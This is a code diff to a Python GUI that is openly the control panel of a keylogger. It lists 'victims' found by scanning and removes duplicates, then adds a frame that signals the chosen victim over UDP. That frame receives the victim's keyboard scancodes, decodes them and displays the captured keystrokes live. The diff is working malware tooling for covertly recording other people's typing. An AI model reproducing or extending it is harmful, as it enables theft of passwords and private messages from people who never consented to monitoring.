@@ -5,8 +5,8 @@ import queue
 import time
 
 codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
-         '-', '=', "BKSP", "TAB", 'q', 'w', 'e', 'r', 't', 'y', 
-         'u', 'i', 'o', 'p', '[', ']', "ENTER", "CTRL", 'a', 's', 
+         '-', '=', "BKSP", "\t", 'q', 'w', 'e', 'r', 't', 'y', 
+         'u', 'i', 'o', 'p', '[', ']', "\n", "CTRL", 'a', 's', 
          'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', "LSHIFT", 
          '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 
          "RSHIFT", "PRTSCR", "ALT", ' ', "CAPSLOCK", "F1", "F2", 
@@ -90,23 +90,11 @@ class ScanningMachinesFrame(ctk.CTkFrame):
         self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
         self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
         self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
-        self.incoming_queue.put((b"SPWR", ("127.0.0.1", 49532)))
         self.stop_scanning = False
         listening_thread = threading.Thread(target=self.scan_incoming_victims, name='victims-scanning-thread')
         listening_thread.start()
         
-        time.sleep(1)
+        time.sleep(3)
         
         self.stop_scanning = True
         self.bar.stop()
@@ -154,7 +142,12 @@ class ChoosingVictimFrame(ctk.CTkScrollableFrame):
         self.grid_columnconfigure(3, weight=1)
 
         victim_frames = []
+        victim_addresses = []
         while not victims.empty():
+            if victims.queue[0][1] in victim_addresses:
+                victims.get()
+                continue
+            victim_addresses.append(victims.queue[0][1])
             victim_frames.append(VictimFrame(self, victims.get()))
         
         for i, victim in enumerate(victim_frames):
@@ -175,7 +168,6 @@ class VictimFrame(ctk.CTkFrame):
         self.grid_columnconfigure(0, weight=1)
         self.grid_rowconfigure(0, weight=1)
         self.grid_rowconfigure(1, weight=1)
-        # self.grid_rowconfigure(2, weight=1)
 
         self.label = ctk.CTkLabel(self, text=f"IP: {victim[1][0]}\nPort: {victim[1][1]}")
         self.label.grid(row=0, column=0, padx=0, pady=0)
@@ -196,12 +188,36 @@ class KeyloggerFrame(ctk.CTkFrame):
         self.victim = victim
         
         self.grid_rowconfigure(0, weight=1)
+        self.grid_rowconfigure(1, weight=4)
         self.grid_columnconfigure(0, weight=1)
 
+        self.label = ctk.CTkLabel(self, text="Keylogger", font=("Arial", 30))
+        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
         self.textbox = ctk.CTkTextbox(self, font=("Arial", 16))
-        self.textbox.grid(row=0, column=0, sticky="nsew")
-        self.textbox.insert("0.0", "Some example text!\n" * 50)
+        self.textbox.grid(row=1, column=0, sticky="nsew")
+        
         self.textbox.configure(state="disabled")
+
+        self.thread = threading.Thread(target=self.start)
+
+
+    def start(self):
+        global sock
+        sock.sendto(b"OKAY", self.victim[1])
+        sock.close()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind(('', KEYLOGS_PORT))
+        while True:
+            data, address = sock.recvfrom(256)
+            if (address != self.victim[1]):
+                continue
+            logs = decode_scancodes(data[1:])
+            # print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")
+
+            self.textbox.configure(state="normal")
+            self.textbox.insert("end", logs)
+            self.textbox.configure(state="disabled")
+
 
 
 class App(ctk.CTk):
@@ -232,6 +248,7 @@ class App(ctk.CTk):
         self.choose_frame.destroy()
         self.keylogger_frame = KeyloggerFrame(self, victim)
         self.keylogger_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
+        self.keylogger_frame.thread.start()
 
 
 def main():
